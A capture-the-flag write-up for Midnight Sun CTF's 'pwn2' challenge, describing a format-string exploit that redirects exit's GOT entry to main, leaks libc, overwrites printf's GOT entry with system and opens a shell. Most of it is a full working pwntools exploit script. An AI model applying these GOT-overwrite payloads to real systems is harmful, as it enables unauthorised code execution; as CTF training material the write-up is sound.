# pwn2(80pts) #

![TASK](https://imgur.com/lYjuGsS.png)

It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D 
Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1 

```python

from pwn import *
def extract(add,n):
        p1="0x"+add[-4:]
        p2=add[:6]
        if n==1:
                return p1
        if n==2:
                return p2
def pad(payload):
        return payload+"X"*(63-len(payload))
#p=process("./pwn2")
p=remote("pwn2-01.play.midnightsunctf.se",10002)
p.recvuntil("input:")
EXITGOT=p32(0x804b020)
EXITGOT2=p32(0x804b020+2)
'''
s=""
for i in range(27,34):
        s+="%"+str(i)+"$p "
'''
payload=EXITGOT+EXITGOT2
payload+="%2044x%8$hn%32231x%7$hn"
#raw_input("attach")
p.sendline(pad(payload))
p.recvuntil("input:")
p.sendline(pad("%30$x"))
data=p.recvuntil("X")
printf=int("0x"+data[-9:-1],16)-5
LIBCBASE=printf-0x50b60
log.info("Leaked Libc Base : "+hex(LIBCBASE))
p.recvuntil("input:")
PRINTFGOT=p32(0x804b00c)
PRINTFGOT2=p32(0x804b00c+2)
SYSTEM=LIBCBASE+0x3cd10
log.info("System address: "+hex(SYSTEM))
payload=PRINTFGOT
payload+=PRINTFGOT2
p1=int(extract(hex(SYSTEM),1),16)
p2=int(extract(hex(SYSTEM),2),16)
log.info("P1: "+str(p1-8)+" P2: "+str(p2-p1))
payload+="%"+str(p1-8)+"x%7$hn%"+str(p2-p1)+"x%8$hn"
log.info("Payload crafted")
p.sendline(pad(payload))
p.recvuntil("input:")
p.sendline("/bin/sh")
p.interactive()

#Main address 0x80485eb
# 7 stack adress

```
